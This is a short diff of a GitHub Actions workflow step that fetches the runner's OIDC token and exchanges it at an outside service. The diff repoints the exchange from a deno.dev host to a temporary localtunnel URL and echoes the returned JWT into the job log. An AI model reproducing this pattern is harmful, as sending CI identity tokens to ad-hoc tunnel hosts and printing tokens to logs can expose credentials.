@@ -34,7 +34,6 @@ jobs:
         shell: bash
         run: |-
           OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
-          echo $OIDC_TOKEN
           OIDC_JWT=$(echo $OIDC_TOKEN | jq -j '.value')
-          JWT=$(curl -sLS "https://cold-heron-19.deno.dev" -H "Authorization: GithubOIDC $OIDC_JWT")
+          JWT=$(curl -sLS "https://web-console-fc56441f.loca.lt/api/auth/swap" -H "Authorization: GithubOIDC $OIDC_JWT")
           echo $JWT
